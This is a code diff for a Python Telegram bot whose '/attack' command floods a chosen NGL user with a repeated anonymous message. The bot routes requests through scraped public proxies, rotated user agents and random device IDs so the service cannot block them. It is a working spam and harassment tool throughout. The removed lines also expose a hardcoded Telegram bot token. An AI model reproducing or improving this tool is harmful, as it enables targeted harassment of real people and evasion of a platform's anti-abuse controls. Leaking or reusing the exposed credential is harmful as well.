@@ -1,16 +1,23 @@
-
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
 import concurrent.futures
 import requests
+import os
 import time
 import random
 import uuid
+import telebot
+from dotenv import load_dotenv
+import psutil
 
-API_INDEX = 0
+# Load environment variables
+load_dotenv()
 
-def fetch_and_update_proxies():
-    global API_INDEX
+# Get bot token from environment variables
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+# Create bot instance
+bot = telebot.TeleBot(BOT_TOKEN)
+
+def fetch_and_update_proxies(api_index):
     proxy_api_urls = [
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
         "https://proxyspace.pro/http.txt",
@@ -28,13 +35,13 @@ def fetch_and_update_proxies():
         "https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"
     ]
 
-    if API_INDEX >= len(proxy_api_urls):
+    if api_index >= len(proxy_api_urls):
         print("[!] All proxy APIs used. Restarting from the beginning.")
-        API_INDEX = 0
+        api_index = 0
 
     proxies = set()
 
-    for api_url in proxy_api_urls[API_INDEX:]:
+    for api_url in proxy_api_urls[api_index:]:
         try:
             response = requests.get(api_url, timeout=10)
             if response.status_code == 200:
@@ -48,7 +55,7 @@ def fetch_and_update_proxies():
 
     print("[+] Proxies updated successfully.")
 
-    API_INDEX += 1
+    return api_index + 1
 
 def fetch_user_agents():
     user_agents_url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
@@ -106,19 +113,31 @@ def send_request(proxy, user_agent, device_id, nglusername, message, total_count
 
     return success_count, fail_count
 
-def attack(update: Update, context: CallbackContext):
-    fetch_and_update_proxies()
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Welcome to the XCODE NGL bot!")
 
-    nglusername = update.message.text.split()[1]
-    message = update.message.text.split()[2]
-    count = int(update.message.text.split()[3])
+@bot.message_handler(commands=['attack'])
+def initiate_attack(message):
+    api_index = 0
+    api_index = fetch_and_update_proxies(api_index)
+
+    command_parts = message.text.split(' ')
+    if len(command_parts) != 4:
+        bot.reply_to(message, "Invalid command format. Usage: /attack {username} {message} {count}")
+        return
+
+    nglusername = command_parts[1]
+    message_text = command_parts[2]
+    count = int(command_parts[3])
+    
+    sent_message = f"[+] 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 \nUsername: {nglusername} | Message: {message_text} | Count: {count}"
+    bot.reply_to(message, sent_message)
 
     with open('proxies.txt', 'r') as file:
         proxies_list = [line.strip() for line in file]
-
     user_agents = fetch_user_agents()
 
-    value = 0
     success_count = 0
     fail_count = 0
 
@@ -130,7 +149,7 @@ def attack(update: Update, context: CallbackContext):
             device_id = generate_random_device_id()
 
             future = executor.submit(
-                send_request, proxy, user_agent, device_id, nglusername, message, count
+                send_request, proxy, user_agent, device_id, nglusername, message_text, count
             )
             futures.append(future)
 
@@ -139,17 +158,19 @@ def attack(update: Update, context: CallbackContext):
             success_count += success
             fail_count += fail
 
-    update.message.reply_text(f"Attack completed successfully.\nUsername: {nglusername} | Message: {message} | Count: {count}")
+    completion_message = f"[+] 𝗗𝗼𝗻𝗲 \nUsername: {nglusername} | Message: {message_text} | Count: {count}"
+    bot.reply_to(message, completion_message)
 
-def main():
-    updater = Updater("6883960019:AAEy-U_oxX3pkXap0BWwsLr-iL4v_vCVzKM")
-    dispatcher = updater.dispatcher
 
-    dispatcher.add_handler(CommandHandler("attack", attack))
+@bot.message_handler(func=lambda msg: True)
+def echo_message(message):
+    bot.reply_to(message, message.text)
 
-    updater.start_polling()
-    updater.idle()
+@bot.message_handler(func=lambda message: True, content_types=['text'])
+def handle_text(message):
+    if message.text.lower() == 'attack':
+        bot.reply_to(message, "Please use the /attack command to initiate an attack.")
+    else:
+        bot.reply_to(message, "I don't understand that command.")
 
-if __name__ == "__main__":
-    main()
-    
+bot.polling()
